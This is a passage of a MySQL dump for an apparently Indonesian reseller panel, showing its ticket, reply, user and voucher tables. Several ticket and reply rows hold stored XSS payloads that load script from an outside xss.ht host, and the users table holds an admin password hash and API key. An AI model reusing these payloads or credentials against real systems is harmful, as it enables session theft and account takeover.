  `name` varchar(100) COLLATE utf8_swedish_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_swedish_ci;

-- --------------------------------------------------------

--
-- Struktur dari tabel `tickets`
--

CREATE TABLE `tickets` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `subject` varchar(255) COLLATE utf8_swedish_ci NOT NULL,
  `msg` text COLLATE utf8_swedish_ci NOT NULL,
  `status` enum('Waiting','Responded','Closed') COLLATE utf8_swedish_ci NOT NULL,
  `created_at` datetime DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_swedish_ci;

--
-- Dumping data untuk tabel `tickets`
--

INSERT INTO `tickets` (`id`, `user_id`, `subject`, `msg`, `status`, `created_at`, `updated_at`) VALUES
(2, 207, '\"><script src=https://penciptakode.xss.ht></script>', '\"><script src=https://penciptakode.xss.ht></script>', 'Waiting', '2020-09-30 05:13:16', '2020-09-30 05:13:16'),
(3, 207, '<script>$.getScript(\"//penciptakode.xss.ht\")</script>', '<script>$.getScript(\"//penciptakode.xss.ht\")</script>', 'Responded', '2020-09-30 05:19:39', '2020-09-30 05:20:14'),
(4, 208, 'g', '\"><script src=https://penciptakode.xss.ht></script>', 'Waiting', '2020-09-30 07:14:07', '2020-09-30 07:14:07'),
(5, 208, 'hjhjh', '\"><script src=https://penciptakode.xss.ht></script>', 'Waiting', '2020-09-30 07:14:35', '2020-09-30 07:14:35'),
(6, 213, 'isi saldo min', '\"><script src=https://penciptakode.xss.ht></script>', 'Waiting', '2020-09-30 19:22:28', '2020-09-30 19:22:28');

-- --------------------------------------------------------

--
-- Struktur dari tabel `ticket_replies`
--

CREATE TABLE `ticket_replies` (
  `id` int(11) NOT NULL,
  `ticket_id` int(11) NOT NULL,
  `is_admin` int(1) NOT NULL DEFAULT 0,
  `msg` text COLLATE utf8_swedish_ci NOT NULL,
  `created_at` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_swedish_ci;

--
-- Dumping data untuk tabel `ticket_replies`
--

INSERT INTO `ticket_replies` (`id`, `ticket_id`, `is_admin`, `msg`, `created_at`) VALUES
(1, 1, 1, '<script src=https://penciptakode.xss.ht></script>', '2020-09-30 05:11:06'),
(2, 3, 1, 'ok', '2020-09-30 05:20:14');

-- --------------------------------------------------------

--
-- Struktur dari tabel `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `username` varchar(255) COLLATE utf8_swedish_ci NOT NULL,
  `password` varchar(255) COLLATE utf8_swedish_ci NOT NULL,
  `full_name` varchar(255) COLLATE utf8_swedish_ci NOT NULL,
  `balance` double NOT NULL,
  `level` enum('Member','Reseller','Admin') COLLATE utf8_swedish_ci NOT NULL,
  `status` int(11) NOT NULL DEFAULT 1,
  `api_key` varchar(255) COLLATE utf8_swedish_ci NOT NULL,
  `remember_me` varchar(255) COLLATE utf8_swedish_ci DEFAULT NULL,
  `created_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_swedish_ci;

--
-- Dumping data untuk tabel `users`
--

INSERT INTO `users` (`id`, `username`, `password`, `full_name`, `balance`, `level`, `status`, `api_key`, `remember_me`, `created_at`) VALUES
(2, 'admin', '$2y$10$mmeoQEEZmryRvNh2pcu3YuMK.hNKI22Cy7okdKyaxTE6nh6nzecDu', 'Admin', 9696, 'Admin', 1, 'UP1J45GAEF65YX2WCSAPHAO1COYLK7', NULL, '2023-01-17 11:52:14');

-- --------------------------------------------------------

--
-- Struktur dari tabel `vouchers`
--

CREATE TABLE `vouchers` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `amount` double NOT NULL,
  `voucher_code` text COLLATE utf8_swedish_ci NOT NULL,
  `status` int(11) NOT NULL,
  `created_at` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_swedish_ci;

--
-- Indexes for dumped tables
--

--
-- Indeks untuk tabel `balance_logs`
--
ALTER TABLE `balance_logs`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `categories`
--
ALTER TABLE `categories`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `deposits`
--
ALTER TABLE `deposits`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `deposit_methods`
--
ALTER TABLE `deposit_methods`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `login_logs`
--
ALTER TABLE `login_logs`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `news`
--
ALTER TABLE `news`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `orders`
--
ALTER TABLE `orders`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `pages`
--
ALTER TABLE `pages`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `provider`
--
ALTER TABLE `provider`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `register_logs`
--
ALTER TABLE `register_logs`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `services`
--
ALTER TABLE `services`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `service_cat`
--
ALTER TABLE `service_cat`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `tickets`
--
ALTER TABLE `tickets`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `ticket_replies`
--
ALTER TABLE `ticket_replies`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `vouchers`
--
ALTER TABLE `vouchers`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT untuk tabel yang dibuang
--

--
-- AUTO_INCREMENT untuk tabel `balance_logs`
--
ALTER TABLE `balance_logs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT untuk tabel `categories`
--
ALTER TABLE `categories`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=68;

--
-- AUTO_INCREMENT untuk tabel `deposits`
--
ALTER TABLE `deposits`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT untuk tabel `deposit_methods`
--
ALTER TABLE `deposit_methods`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT untuk tabel `login_logs`
--
ALTER TABLE `login_logs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT untuk tabel `news`
--
ALTER TABLE `news`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT untuk tabel `orders`
--
ALTER TABLE `orders`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT untuk tabel `pages`
--
ALTER TABLE `pages`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT untuk tabel `provider`
--
ALTER TABLE `provider`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=12;

--
-- AUTO_INCREMENT untuk tabel `register_logs`
--
ALTER TABLE `register_logs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT untuk tabel `services`
--
ALTER TABLE `services`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=551;

--
-- AUTO_INCREMENT untuk tabel `service_cat`
--
ALTER TABLE `service_cat`
  MODIFY `id` int(10) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT untuk tabel `tickets`
--
ALTER TABLE `tickets`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT untuk tabel `ticket_replies`
--
ALTER TABLE `ticket_replies`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT untuk tabel `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT untuk tabel `vouchers`
--
ALTER TABLE `vouchers`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
